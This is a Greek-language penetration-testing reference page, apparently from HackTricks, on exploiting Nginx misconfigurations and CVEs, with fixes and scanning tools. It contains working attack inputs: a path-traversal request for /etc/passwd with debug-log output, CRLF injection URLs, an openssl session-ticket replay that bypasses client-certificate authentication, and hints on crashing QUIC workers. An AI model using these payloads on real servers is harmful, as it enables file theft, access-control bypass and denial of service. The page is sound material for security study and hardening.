# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Απουσία root location <a href="#missing-root-location" id="missing-root-location"></a>

Κατά τη διαμόρφωση του Nginx, η **root directive** παίζει κρίσιμο ρόλο, ορίζοντας τον βασικό φάκελο από τον οποίο εξυπηρετούνται τα αρχεία. Δείτε το παρακάτω παράδειγμα:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
Σ' αυτή τη διαμόρφωση, `/etc/nginx` ορίζεται ως ο root κατάλογος. Αυτή η ρύθμιση επιτρέπει την πρόσβαση σε αρχεία εντός του καθορισμένου root καταλόγου, όπως το `/hello.txt`. Ωστόσο, είναι σημαντικό να σημειωθεί ότι έχει οριστεί μόνο μια συγκεκριμένη location (`/hello.txt`). Δεν υπάρχει διαμόρφωση για τη ρίζα (`location / {...}`). Αυτή η παράλειψη σημαίνει ότι η οδηγία root εφαρμόζεται παγκοσμίως, επιτρέποντας αιτήματα στην ρίζα `/` να έχουν πρόσβαση σε αρχεία κάτω από το `/etc/nginx`.

Από αυτή τη διαμόρφωση προκύπτει ένα κρίσιμο ζήτημα ασφάλειας. Ένα απλό αίτημα `GET`, όπως `GET /nginx.conf`, θα μπορούσε να αποκαλύψει ευαίσθητες πληροφορίες υπηρετώντας το αρχείο ρύθμισης του Nginx που βρίσκεται στο `/etc/nginx/nginx.conf`. Ο ορισμός του root σε έναν λιγότερο ευαίσθητο κατάλογο, όπως το `/etc`, μπορεί να μετριάσει αυτόν τον κίνδυνο, ωστόσο μπορεί ακόμα να επιτρέψει μη επιθυμητή πρόσβαση σε άλλα κρίσιμα αρχεία, συμπεριλαμβανομένων άλλων αρχείων ρυθμίσεων, αρχείων καταγραφής πρόσβασης, και ακόμη και κρυπτογραφημένων διαπιστευτηρίων που χρησιμοποιούνται για HTTP basic authentication.

## Λανθασμένη διαμόρφωση Alias LFI <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Στα αρχεία διαμόρφωσης του Nginx αξίζει προσεκτική ανασκόπηση των "location" directives. Μια ευπάθεια γνωστή ως Local File Inclusion (LFI) μπορεί να εισαχθεί ακούσια μέσω μιας διαμόρφωσης που μοιάζει με την παρακάτω:
```
location /imgs {
alias /path/images/;
}
```
Αυτή η διαμόρφωση είναι επιρρεπής σε LFI attacks λόγω του ότι ο server ερμηνεύει requests όπως `/imgs../flag.txt` ως προσπάθεια πρόσβασης σε αρχεία εκτός του προοριζόμενου καταλόγου, ουσιαστικά επιλύοντας σε `/path/images/../flag.txt`. Αυτό το σφάλμα επιτρέπει σε attackers να ανακτούν αρχεία από το server filesystem που δεν θα έπρεπε να είναι προσβάσιμα μέσω του web.

Για να μετριαστεί αυτή η vulnerability, η διαμόρφωση πρέπει να προσαρμοστεί ως εξής:
```
location /imgs/ {
alias /path/images/;
}
```
Περισσότερες πληροφορίες: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Δοκιμές Accunetix:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Μη ασφαλής περιορισμός διαδρομής <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Δείτε την παρακάτω σελίδα για να μάθετε πώς να παρακάμπτετε οδηγίες όπως:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Ανασφαλής χρήση μεταβλητών / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Υπάρχουν ευπαθείς μεταβλητές `$uri` και `$document_ur`i — αυτό μπορεί να διορθωθεί αντικαθιστώντας τες με `$request_uri`.
>
> Μια regex μπορεί επίσης να είναι ευπαθής όπως:
>
> `location ~ /docs/([^/])? { … $1 … }` - Ευπαθές
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Μη ευπαθές (έλεγχος κενών)
>
> `location ~ /docs/(.*)? { … $1 … }` - Μη ευπαθές

Μια ευπάθεια στην διαμόρφωση του Nginx αποδεικνύεται από το παρακάτω παράδειγμα:
```
location / {
return 302 https://example.com$uri;
}
```
Οι χαρακτήρες \r (Carriage Return) και \n (Line Feed) σηματοδοτούν χαρακτήρες νέας γραμμής σε HTTP requests, και οι URL-encoded μορφές τους αναπαρίστανται ως `%0d%0a`. Η συμπερίληψη αυτών των χαρακτήρων σε ένα αίτημα (π.χ., `http://localhost/%0d%0aDetectify:%20clrf`) προς έναν λανθασμένα ρυθμισμένο server έχει ως αποτέλεσμα ο server να εκδίδει ένα νέο header με το όνομα `Detectify`. Αυτό συμβαίνει επειδή η μεταβλητή $uri αποκωδικοποιεί τους URL-encoded χαρακτήρες νέας γραμμής, οδηγώντας σε έναν απροσδόκητο header στην response:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Μάθετε περισσότερα για τους κινδύνους του CRLF injection και του response splitting στο [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Επιπλέον, αυτή η τεχνική [**εξηγείται σε αυτήν την παρουσίαση**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) με κάποια ευάλωτα παραδείγματα και μηχανισμούς ανίχνευσης. Για παράδειγμα, για να εντοπίσετε αυτή τη λανθασμένη διαμόρφωση από μια blackbox προοπτική μπορείτε να χρησιμοποιήσετε τα ακόλουθα αιτήματα:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Αν είναι ευάλωτο, το πρώτο θα επιστρέψει (καθώς "X" είναι οποιαδήποτε HTTP μέθοδος) και το δεύτερο θα επιστρέψει σφάλμα επειδή το "H" δεν είναι έγκυρη μέθοδος. Έτσι ο διακομιστής θα λάβει κάτι σαν: `GET / H HTTP/1.1` και αυτό θα ενεργοποιήσει το σφάλμα.

Άλλα παραδείγματα ανίχνευσης είναι:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Κάποιες ευάλωτες διαμορφώσεις που παρουσιάστηκαν σε εκείνη την παρουσίαση ήταν:

- Σημειώστε πώς **`$uri`** ορίζεται ως έχει στο τελικό URL
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Παρατηρήστε πώς το **`$uri`** βρίσκεται ξανά στο URL (αυτή τη φορά μέσα σε παράμετρο)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Τώρα στο AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Οποιαδήποτε μεταβλητή

Ανακαλύφθηκε ότι **δεδομένα που παρέχονται από τον χρήστη** μπορεί να αντιμετωπίζονται ως **Nginx variable** υπό ορισμένες συνθήκες. Η αιτία αυτής της συμπεριφοράς παραμένει κάπως ασαφής, όμως δεν είναι σπάνιο ούτε εύκολο να επαληθευτεί. Αυτή η ανωμαλία επισημάνθηκε σε αναφορά ασφάλειας στο HackerOne, την οποία μπορείτε να δείτε [here](https://hackerone.com/reports/370094). Περαιτέρω διερεύνηση του μηνύματος σφάλματος οδήγησε στον εντοπισμό της εμφάνισής του μέσα στο [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), αποδίδοντας ως βασική αιτία τα Server Side Includes (SSI).

Για να **εντοπιστεί αυτή η λανθασμένη ρύθμιση**, μπορεί να εκτελεστεί η ακόλουθη εντολή, η οποία περιλαμβάνει τη ρύθμιση ενός referer header για να δοκιμαστεί η εκτύπωση μεταβλητής:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Σαρώσεις για αυτή τη λανθασμένη διαμόρφωση σε συστήματα αποκάλυψαν πολλαπλές περιπτώσεις όπου μεταβλητές του Nginx μπορούσαν να εμφανιστούν από έναν χρήστη. Ωστόσο, η μείωση του αριθμού των ευπαθών περιπτώσεων υποδηλώνει ότι οι προσπάθειες επιδιόρθωσης αυτού του ζητήματος ήταν κάπως επιτυχείς.

### Χρήση try_files με $URI$ARGS μεταβλητές

Η ακόλουθη λανθασμένη διαμόρφωση του Nginx μπορεί να οδηγήσει σε ευπάθεια LFI:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
Στην διαμόρφωσή μας έχουμε την οδηγία `try_files` η οποία χρησιμοποιείται για να ελέγξει την ύπαρξη αρχείων με συγκεκριμένη σειρά. Το Nginx θα εξυπηρετήσει το πρώτο που θα βρει. Η βασική σύνταξη της οδηγίας `try_files` είναι η εξής:
```
try_files file1 file2 ... fileN fallback;
```
Το Nginx θα ελέγξει για την ύπαρξη κάθε αρχείου με τη συγκεκριμένη σειρά. Εάν ένα αρχείο υπάρχει, θα σερβιριστεί αμέσως. Αν κανένα από τα καθορισμένα αρχεία δεν υπάρχει, το request θα προωθηθεί στην fallback επιλογή, η οποία μπορεί να είναι άλλη URI ή μία συγκεκριμένη σελίδα σφάλματος.

Ωστόσο, όταν χρησιμοποιούνται οι μεταβλητές `$uri$args` σε αυτήν την οδηγία, το Nginx θα προσπαθήσει να βρει ένα αρχείο που ταιριάζει με το request URI συνδυασμένο με τυχόν query string arguments. Επομένως μπορούμε να εκμεταλλευτούμε αυτή τη διαμόρφωση:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Με το ακόλουθο payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Χρησιμοποιώντας το payload μας θα ξεφύγουμε από το root directory (defined in Nginx configuration) και θα φορτώσουμε το αρχείο `/etc/passwd`. Στα debug logs μπορούμε να παρατηρήσουμε πώς ο Nginx δοκιμάζει τα αρχεία:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC ενάντια σε Nginx χρησιμοποιώντας τη διαμόρφωση που αναφέρθηκε παραπάνω:
![Example burp request](../../images/nginx_try_files.png)

## Ανάγνωση raw απάντησης backend

Το Nginx προσφέρει μια δυνατότητα μέσω του `proxy_pass` που επιτρέπει την παρεμβολή στα σφάλματα και τα HTTP headers που παράγονται από το backend, με στόχο την απόκρυψη εσωτερικών μηνυμάτων σφάλματος και headers. Αυτό επιτυγχάνεται με το Nginx να σερβίρει προσαρμοσμένες σελίδες σφάλματος ως απάντηση σε σφάλματα του backend. Ωστόσο, προκύπτουν προβλήματα όταν το Nginx λαμβάνει ένα μη έγκυρο HTTP request. Ένα τέτοιο request προωθείται στο backend όπως λήφθηκε, και η raw απάντηση του backend αποστέλλεται κατευθείαν στον client χωρίς παρέμβαση του Nginx.

Σκεφτείτε ένα παράδειγμα σεναρίου που περιλαμβάνει μια εφαρμογή uWSGI:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Για να το διαχειριστείτε, χρησιμοποιούνται συγκεκριμένες οδηγίες στη διαμόρφωση του Nginx:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Αυτή η οδηγία επιτρέπει στον Nginx να σερβίρει μια προσαρμοσμένη απάντηση για αποκρίσεις του backend με κωδικό κατάστασης μεγαλύτερο από 300. Εξασφαλίζει ότι, για το παράδειγμα της εφαρμογής uWSGI, μια `500 Error` απάντηση θα αναχαιτιστεί και θα χειριστεί από τον Nginx.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Όπως υποδηλώνει το όνομα, αυτή η οδηγία κρύβει συγκεκριμένα HTTP headers από τον client, βελτιώνοντας το απόρρητο και την ασφάλεια.

Όταν γίνεται ένα έγκυρο `GET` request, ο Nginx το επεξεργάζεται κανονικά, επιστρέφοντας μια στάνταρ απάντηση λάθους χωρίς να αποκαλύπτει μυστικά headers. Ωστόσο, ένα μη έγκυρο HTTP request παρακάμπτει αυτόν τον μηχανισμό, με αποτέλεσμα την έκθεση των ακατέργαστων αποκρίσεων του backend, συμπεριλαμβανομένων μυστικών headers και μηνυμάτων λάθους.

## merge_slashes ρυθμισμένο σε off

Εξ ορισμού, η οδηγία **`merge_slashes`** του Nginx είναι ρυθμισμένη σε **`on`**, το οποίο συμπιέζει πολλαπλά `/` σε ένα μόνο `/` στο URL. Αυτό το χαρακτηριστικό, ενώ απλοποιεί την επεξεργασία URL, μπορεί άθελά του να αποκρύψει ευπάθειες σε εφαρμογές πίσω από τον Nginx, ιδιαίτερα αυτές ευπαθείς σε local file inclusion (LFI) επιθέσεις. Οι ειδικοί ασφάλειας **Danny Robinson and Rotem Bar** έχουν επισημάνει τους πιθανούς κινδύνους που σχετίζονται με αυτή τη προεπιλεγμένη συμπεριφορά, ειδικά όταν ο Nginx λειτουργεί ως reverse-proxy.

Για να μετριαστούν αυτοί οι κίνδυνοι, συνιστάται να **απενεργοποιήσετε την οδηγία `merge_slashes`** για εφαρμογές που είναι ευαίσθητες σε αυτές τις ευπάθειες. Αυτό διασφαλίζει ότι ο Nginx προωθεί requests στην εφαρμογή χωρίς να αλλάζει τη δομή του URL, και έτσι δεν αποκρύπτονται υποκείμενα ζητήματα ασφάλειας.

Για περισσότερες πληροφορίες δείτε [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Response Headers**

Όπως φαίνεται στο [**this writeup**](https://mizu.re/post/cors-playground), υπάρχουν ορισμένα headers που, εάν υπάρχουν στην απάντηση από τον web server, θα αλλάξουν τη συμπεριφορά του Nginx proxy. Μπορείτε να τα ελέγξετε [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Δηλώνει στον Nginx να εκτελέσει εσωτερική ανακατεύθυνση ενός request σε μια καθορισμένη τοποθεσία.
- `X-Accel-Buffering`: Ελέγχει αν ο Nginx θα κάνει buffering της απάντησης ή όχι.
- `X-Accel-Charset`: Ορίζει το character set για την απάντηση όταν χρησιμοποιείται X-Accel-Redirect.
- `X-Accel-Expires`: Ορίζει τον χρόνο λήξης για την απάντηση όταν χρησιμοποιείται X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Περιορίζει το ρυθμό μεταφοράς για απαντήσεις όταν χρησιμοποιείται X-Accel-Redirect.

Για παράδειγμα, το header **`X-Accel-Redirect`** θα προκαλέσει μια εσωτερική **ανακατεύθυνση** στον nginx. Έτσι, έχοντας μια nginx configuration με κάτι όπως **`root /`** και μια απάντηση από τον web server με **`X-Accel-Redirect: .env`**, ο nginx θα στείλει το περιεχόμενο του **`/.env`** (Path Traversal).

### **Προεπιλεγμένη Τιμή στην οδηγία map**

Στην **Nginx configuration**, η οδηγία `map` συχνά παίζει ρόλο στον έλεγχο εξουσιοδότησης. Ένα κοινό λάθος είναι να μην οριστεί μια τιμή **default**, κάτι που μπορεί να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση. Για παράδειγμα:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Χωρίς το `default`, ένας **κακόβουλος χρήστης** μπορεί να παρακάμψει την ασφάλεια αποκτώντας πρόσβαση σε ένα **μη ορισμένο URI** μέσα στο `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) συμβουλεύει τον καθορισμό μιας **προεπιλεγμένης τιμής** για να αποφευχθούν τέτοια προβλήματα.

### **DNS Spoofing Vulnerability**

Το DNS spoofing εναντίον του Nginx είναι εφικτό υπό ορισμένες συνθήκες. Εάν ένας επιτιθέμενος γνωρίζει τον **DNS server** που χρησιμοποιεί ο Nginx και μπορεί να υποκλέψει τα DNS queries του, μπορεί να spoof DNS records. Ωστόσο, αυτή η μέθοδος είναι αναποτελεσματική εάν ο Nginx είναι ρυθμισμένος να χρησιμοποιεί **localhost (127.0.0.1)** για την επίλυση DNS. Ο Nginx επιτρέπει τον καθορισμό ενός DNS server ως εξής:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` και `internal` Οδηγίες**

Η **`proxy_pass`** οδηγία χρησιμοποιείται για την ανακατεύθυνση αιτήσεων σε άλλους servers, είτε εσωτερικά είτε εξωτερικά. Η **`internal`** οδηγία διασφαλίζει ότι ορισμένες τοποθεσίες είναι προσβάσιμες μόνο εντός του Nginx. Ενώ αυτές οι οδηγίες από μόνες τους δεν αποτελούν ευπάθειες, η ρύθμισή τους απαιτεί προσεκτική εξέταση για να αποφευχθούν κενά ασφαλείας.

## proxy_set_header Upgrade & Connection

Εάν ο nginx server είναι ρυθμισμένος να προωθεί τα headers Upgrade και Connection, θα μπορούσε να εκτελεστεί μια [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) για να αποκτηθεί πρόσβαση σε προστατευμένα/εσωτερικά endpoints.

> [!CAUTION]
> Αυτή η ευπάθεια θα επέτρεπε σε έναν attacker να **εγκαθιδρύσει μια άμεση σύνδεση με το `proxy_pass` endpoint** (`http://backend:9999` σε αυτή την περίπτωση) του οποίου το περιεχόμενο δεν θα ελέγχεται από τον nginx.

Παράδειγμα ευπαθούς διαμόρφωσης για να steal `/flag` από [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Σημειώστε ότι ακόμη κι αν το `proxy_pass` έδειχνε σε μια συγκεκριμένη **path** όπως `http://backend:9999/socket.io` η σύνδεση θα εγκαθιδρυθεί με `http://backend:9999`, οπότε μπορείτε να **επιχειρήσετε επικοινωνία με οποιοδήποτε άλλο path μέσα σε αυτό το internal endpoint. Συνεπώς δεν έχει σημασία αν μια διαδρομή καθορίζεται στο URL του proxy_pass.**

## HTTP/3 QUIC module remote DoS & leak (2024)

Κατά τη διάρκεια του 2024 το Nginx αποκάλυψε τις CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 και CVE-2024-35200, δείχνοντας ότι μια **single hostile QUIC session** μπορεί να crashάρει worker processes ή να leak μνήμη όποτε το πειραματικό `ngx_http_v3_module` είναι compiled και ένα `listen ... quic` socket είναι εκτεθειμένο. Επηρεασμένα builds είναι τα 1.25.0–1.25.5 και 1.26.0, ενώ τα 1.27.0/1.26.1 περιέχουν τα fixes· η αποκάλυψη μνήμης (CVE-2024-34161) επιπλέον απαιτεί MTUs μεγαλύτερα από 4096 bytes για να αποκαλυφθούν ευαίσθητα δεδομένα (λεπτομέρειες στην 2024 nginx advisory που αναφέρεται παρακάτω).

**Recon & exploitation hints**

- Το HTTP/3 είναι opt-in, οπότε σκανάρετε για απαντήσεις `Alt-Svc: h3=":443"` ή κάντε brute-force UDP/443 QUIC handshakes· μόλις επιβεβαιωθεί, fuzz το handshake και τα STREAM frames με custom `quiche-client`/`nghttp3` payloads για να προκαλέσετε worker crashes και να εξαναγκάσετε log leakage.
- Quickly fingerprint target support with:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## TLS session resumption bypass of client cert auth (CVE-2025-23419)

Μια ανακοίνωση του Φεβρουαρίου 2025 αποκάλυψε ότι οι nginx 1.11.4–1.27.3 built with OpenSSL επιτρέπουν την **επανχρησιμοποίηση μιας TLS 1.3 session** από ένα name-based virtual host μέσα σε άλλο, έτσι ένας client που διαπραγματεύτηκε ένα certificate-free host μπορεί να αναπαράγει το ticket/PSK για να μεταβεί σε ένα vhost προστατευμένο με `ssl_verify_client on;` και να παρακάμψει εντελώς το mTLS. Το σφάλμα ενεργοποιείται όποτε πολλά virtual hosts μοιράζονται την ίδια TLS 1.3 session cache και tickets (βλέπε την 2025 nginx advisory που αναφέρεται παρακάτω).

**Πλάνο επιτιθέμενου**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Εάν ο στόχος είναι ευπαθής, το δεύτερο handshake ολοκληρώνεται χωρίς να παρουσιαστεί client certificate, αποκαλύπτοντας προστατευμένες τοποθεσίες.

**Τι να ελέγξετε**

- Αναμεμειγμένα `server_name` blocks που μοιράζονται `ssl_session_cache shared:SSL` και `ssl_session_tickets on;`.
- Admin/API μπλοκ που αναμένουν mTLS αλλά κληρονομούν shared session cache/ticket settings από public hosts.
- Αυτοματισμός που ενεργοποιεί TLS 1.3 session resumption παγκοσμίως (π.χ. Ansible roles) χωρίς να λαμβάνει υπόψη vhost isolation.

## Ανθεκτικότητα στο HTTP/2 Rapid Reset (συμπεριφορά CVE-2023-44487)

Η επίθεση HTTP/2 Rapid Reset (CVE-2023-44487) εξακολουθεί να επηρεάζει το nginx όταν οι διαχειριστές αυξάνουν τα `keepalive_requests` ή `http2_max_concurrent_streams` πάνω από τις προεπιλογές: ένας επιτιθέμενος ανοίγει μία HTTP/2 σύνδεση, την κατακλύζει με χιλιάδες streams, και στη συνέχεια αμέσως στέλνει πλαίσια `RST_STREAM` ώστε το ανώτατο όριο concurrency να μην επιτυγχάνεται ποτέ, ενώ η CPU συνεχίζει να καταναλώνει πόρους στη λογική tear-down. Οι προεπιλογές του nginx (128 concurrent streams, 1000 keepalive requests) κρατούν το blast radius μικρό· η σημαντική αύξηση αυτών των ορίων καθιστά εύκολο το να στερηθούν πόρους οι workers ακόμη και από έναν μόνο client (βλ. το F5 write-up που αναφέρεται παρακάτω).

**Συμβουλές ανίχνευσης**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Hosts που αποκαλύπτουν ασυνήθιστα υψηλές τιμές για αυτές τις οδηγίες είναι ιδανικοί στόχοι: ένας HTTP/2 client μπορεί να επαναλαμβάνει τη δημιουργία streams και να στέλνει άμεσα `RST_STREAM` frames για να κρατήσει τη CPU πλήρως φορτωμένη χωρίς να ενεργοποιεί το όριο ταυτόχρονων συνδέσεων.

## Δοκιμάστε το μόνοι σας

Η Detectify δημιούργησε ένα GitHub repository όπου μπορείτε να χρησιμοποιήσετε Docker για να στήσετε τον δικό σας ευάλωτο δοκιμαστικό διακομιστή Nginx με μερικές από τις λανθασμένες ρυθμίσεις που συζητήθηκαν σε αυτό το άρθρο και να προσπαθήσετε να τις εντοπίσετε μόνοι σας!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Εργαλεία στατικής ανάλυσης

### [gixy-ng](https://github.com/dvershinin/gixy) & [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)


- [GixyNG](https://github.com/megamansec/gixyng) (ένα ενημερωμένο fork του GIXY) είναι ένα εργαλείο για την ανάλυση των Nginx configurations, με στόχο την ανεύρεση vulnerabilities, μη ασφαλών directives και επικίνδυνων λανθασμένων ρυθμίσεων. Επίσης εντοπίζει ρυθμίσεις που επηρεάζουν την απόδοση και ανιχνεύει χαμένες ευκαιρίες για hardening, επιτρέποντας αυτοματοποιημένη ανίχνευση ελαττωμάτων.
- [gixy-ng](https://github.com/dvershinin/gixy) (το ενεργά συντηρούμενο fork του GIXY) είναι ένα εργαλείο για την ανάλυση των Nginx configurations, με στόχο την ανεύρεση vulnerabilities, μη ασφαλών directives και επικίνδυνων λανθασμένων ρυθμίσεων. Επίσης εντοπίζει ρυθμίσεις που επηρεάζουν την απόδοση και ανιχνεύει χαμένες ευκαιρίες για hardening, επιτρέποντας αυτοματοποιημένη ανίχνευση ελαττωμάτων.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Το Nginxpwner είναι ένα απλό εργαλείο για την αναζήτηση κοινών λανθασμένων ρυθμίσεων Nginx και ευπαθειών.

## Αναφορές

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
